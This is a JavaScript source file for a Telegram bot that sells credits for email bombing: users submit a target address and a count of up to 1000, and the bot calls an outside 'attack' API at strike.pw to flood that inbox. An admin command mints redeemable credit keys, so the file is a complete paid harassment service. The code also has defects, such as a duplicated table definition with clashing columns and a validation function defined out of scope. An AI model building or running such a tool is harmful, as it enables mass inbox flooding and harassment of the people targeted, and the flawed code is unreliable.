const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
require('dotenv').config();

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });
const dbFile = 'bot.db';
const db = new sqlite3.Database(dbFile, (err) => {
    if (err) {
        return console.error(err.message);
    }
    console.log('Connected to the SQLite database.');
    initializeDatabase();
});

function initializeDatabase() {
    db.serialize(() => {
        db.run(`
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                credits INTEGER DEFAULT 0,
                emails_sent_today INTEGER DEFAULT 0,
                total_emails_sent INTEGER DEFAULT 0
            )
        `);
        db.run(`
            CREATE TABLE IF NOT EXISTS steps (
                userId TEXT PRIMARY KEY,
                step TEXT,
                email_attempts INTEGER DEFAULT 0,
                email TEXT
            )
        `);
        db.run(`
            CREATE TABLE IF NOT EXISTS keys (
                key TEXT PRIMARY KEY,
                credits INTEGER,
                redeemed_by TEXT,
                redeemed_at DATETIME
            )
        `);
        db.run(`CREATE TABLE IF NOT EXISTS keys (
            key TEXT PRIMARY KEY,
            credits INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        db.run(`CREATE INDEX IF NOT EXISTS idx_redeemed_by ON keys (redeemed_by)`);
    });
}

process.on('SIGINT', () => {
    db.close((err) => {
        if (err) {
            return console.error(err.message);
        }
        console.log('Closed the database connection.');
        process.exit(0);
    });
});

// Command: /start
bot.onText(/\/start/, (msg) => {
    const userId = msg.from.id.toString();
    const chatId = msg.chat.id;

    // Check if the user already exists in the database
    db.get("SELECT id FROM users WHERE id = ?", [userId], (err, row) => {
        if (err) {
            bot.sendMessage(chatId, "An error occurred while accessing the database. Please try again later.");
            console.error(err.message);
            return;
        }

        // If the user does not exist, create a new user record
        if (!row) {
            db.run("INSERT INTO users (id, credits, emails_sent_today, total_emails_sent) VALUES (?, 0, 0, 0)", [userId], (err) => {
                if (err) {
                    bot.sendMessage(chatId, "An error occurred while creating your account. Please try again later.");
                    console.error(err.message);
                    return;
                }

                // Welcome message for a new user
                bot.sendMessage(chatId, "Welcome! Your account has been created. Use /help to see available commands.");
            });
        } else {
            // Welcome back message for existing users
            bot.sendMessage(chatId, "Welcome back! Use /help to see available commands.");
        }
    });
});


bot.onText(/\/send/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    db.get("SELECT * FROM users WHERE id = ?", [userId], (err, user) => {
        if (err) {
            bot.sendMessage(chatId, "Error accessing your account. Please try again later.");
            return;
        }

        if (!user) {
            bot.sendMessage(chatId, "Your account is not registered. Please start with /start.");
            return;
        }

        // Removed subscription check - replaced with credit system

        bot.sendMessage(chatId, "Please enter the target email address:");
        db.run("INSERT OR REPLACE INTO steps (userId, step, email_attempts) VALUES (?, 'input_email', 0)", [userId]);
    });
});

bot.onText(/.*/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const text = msg.text;

    db.get("SELECT * FROM steps WHERE userId = ?", [userId], async (err, row) => {
        if (err || !row) return;

        switch (row.step) {
            case 'input_email':
                if (validateEmail(text)) {
                    bot.sendMessage(chatId, "How many emails do you want to send? (Minimum 10, Maximum 1000)");
                    db.run("UPDATE steps SET email = ?, step = 'input_amount' WHERE userId = ?", [text, userId]);
                } else {
                    if (row.email_attempts >= 1) {
                        bot.sendMessage(chatId, "Invalid email address entered twice. Process canceled.");
                        db.run("DELETE FROM steps WHERE userId = ?", [userId]);
                    } else {
                        bot.sendMessage(chatId, "Invalid email address. Please enter a valid email.");
                        db.run("UPDATE steps SET email_attempts = email_attempts + 1 WHERE userId = ?", [userId]);
                    }
                }
                break;

            case 'input_amount':
                const emailAmount = parseInt(text);
                if (!emailAmount || emailAmount < 10 || emailAmount > 1000) {
                    bot.sendMessage(chatId, "Invalid amount entered. Please enter a value between 10 and 1000.");
                    break;
                }

                const creditsNeeded = emailAmount; // 1 credit per email

                db.get("SELECT credits FROM users WHERE id = ?", [userId], async (err, user) => {
                    if (err || !user) {
                        bot.sendMessage(chatId, "There was a problem retrieving your credit information.");
                        return;
                    }

                    if (creditsNeeded > user.credits) {
                        bot.sendMessage(chatId, "You do not have enough credits to send this many emails. Please recharge.");
                        return;
                    }

                    db.run("UPDATE users SET credits = credits - ? WHERE id = ?", [creditsNeeded, userId], async (error) => {
                        if (error) {
                            bot.sendMessage(chatId, "There was a problem updating your credits. Please try again.");
                            return;
                        }

                        // Now perform the API call to send the emails
                        try {
                            const url = `https://strike.pw/api/v1/public/attack?key=${process.env.STRIKE_API_KEY}&target=${encodeURIComponent(row.email)}&mode=normal&amount=${emailAmount}`;
                            const response = await axios.get(url);

                            if (response.data && !response.data.error) {
                                bot.sendMessage(chatId, `Emails sent successfully! You have used ${creditsNeeded} credits.`);
                            } else {
                                db.run("UPDATE users SET credits = credits + ? WHERE id = ?", [creditsNeeded, userId]);
                                bot.sendMessage(chatId, "Failed to send emails. Your credits have been refunded.");
                            }
                        } catch (error) {
                            db.run("UPDATE users SET credits = credits + ? WHERE id = ?", [creditsNeeded, userId]);
                            bot.sendMessage(chatId, "There was an error sending emails. Your credits have been refunded.");
                            console.error("API Call Error:", error.message);
                            if (error.response) {
                                console.error("API Response:", error.response.data);
                            }
                        }
                        // Whether success or failure, delete the steps to reset the process
                        db.run("DELETE FROM steps WHERE userId = ?", [userId]);
                    });
                });
                break;

                function validateEmail(email) {
                const re = /^[\w.-]+@[\w.-]+\.\w+$/;
                return re.test(email);
                }
        }
    });
});

bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    db.get("SELECT credits, total_emails_sent FROM users WHERE id = ?", [userId], (err, user) => {
        if (err) {
            bot.sendMessage(chatId, "There was an error retrieving your information. Please try again later.");
            return;
        }

        if (!user) {
            bot.sendMessage(chatId, "Your account is not registered. Please start with /start.");
            return;
        }

        const creditInfo = `Credits available: ${user.credits}`;
        const emailInfo = `Total emails sent: ${user.total_emails_sent}`;
        bot.sendMessage(chatId, `${creditInfo}\n${emailInfo}`);
    });
});


// Command: /generate (Amount of Emails) (Amount of Keys to generate)
bot.onText(/\/generate (\d+) (\d+)/, (msg, match) => {
    const userId = msg.from.id.toString();
    // This should be adjusted to check if the user is an admin
    // For example, if (admins.includes(userId))
    if (userId === process.env.ADMIN_ID) {
        const emailsPerKey = parseInt(match[1]);
        const numberOfKeys = parseInt(match[2]);

        for (let i = 0; i < numberOfKeys; i++) {
            const key = generateKey();
            db.run("INSERT INTO keys (key, credits) VALUES (?, ?)", [key, emailsPerKey], (err) => {
                if (err) {
                    bot.sendMessage(msg.chat.id, "An error occurred while generating the key.");
                    console.error(err.message);
                } else {
                    bot.sendMessage(msg.chat.id, `Key Generated: ${key}`);
                }
            });
        }
    } else {
        bot.sendMessage(msg.chat.id, "You do not have permission to generate keys.");
    }
});

// Helper function to generate a unique key
function generateKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let key = '';
    for (let i = 0; i < 16; i++) {
        key += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return key;
}

bot.onText(/\/redeem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const redeemKey = match[1];

    if (!redeemKey) {
        bot.sendMessage(chatId, "Please provide a valid key to redeem.");
        return;
    }

    // Start by checking if the key exists and is valid
    db.get("SELECT * FROM keys WHERE key = ?", [redeemKey], (err, keyRow) => {
        if (err) {
            bot.sendMessage(chatId, "There was an error checking the key. Please try again later.");
            return;
        }

        if (!keyRow) {
            bot.sendMessage(chatId, "The key provided is not valid or has already been used.");
            return;
        }

        // Key is valid, add credits to user
        db.run("BEGIN TRANSACTION");
        db.run("UPDATE users SET credits = credits + ? WHERE id = ?", [keyRow.credits, userId], (updateErr) => {
            if (updateErr) {
                bot.sendMessage(chatId, "There was an error crediting your account. Please try again later.");
                db.run("ROLLBACK");
                return;
            }

            // Remove the key so it can't be used again
            db.run("DELETE FROM keys WHERE key = ?", [redeemKey], (deleteErr) => {
                if (deleteErr) {
                    bot.sendMessage(chatId, "There was an error finalizing the redemption process. Please contact support.");
                    db.run("ROLLBACK");
                    return;
                }

                db.run("COMMIT");
                bot.sendMessage(chatId, `Successfully added ${keyRow.credits} credits to your account.`);
            });
        });
    });
});


// ... Rest of the bot.onText callbacks for handling various commands

// Remember to close the database when the bot shuts down
process.on('SIGINT', () => {
    db.close((err) => {
        if (err) {
            return console.error(err.message);
        }
        console.log('Closed the database connection.');
        process.exit(0);
    });
});
